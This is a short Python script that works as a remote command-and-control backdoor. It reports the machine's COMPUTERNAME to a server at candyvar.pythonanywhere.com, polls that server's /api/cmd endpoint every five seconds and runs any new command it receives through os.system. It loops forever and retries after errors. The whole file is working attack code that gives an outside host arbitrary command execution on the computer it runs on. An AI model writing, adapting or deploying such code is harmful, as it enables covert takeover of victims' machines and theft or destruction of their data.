import os
import time

import requests

ip = "https://candyvar.pythonanywhere.com/"

data = {
    "pc": os.getenv('COMPUTERNAME'),
}
pcmd = ''
it = 1
while True:
    try:
        while True:
            response = requests.post(f"{ip}/api/cmd", json=data).json()
            if response["res"] != pcmd:
                print(response)
                os.system(response["res"])
                pcmd = response["res"]
            else:
                print("No new")
            time.sleep(5)
    except Exception as e:
        print(e)
        print(it)
        time.sleep(5)
    it += 1
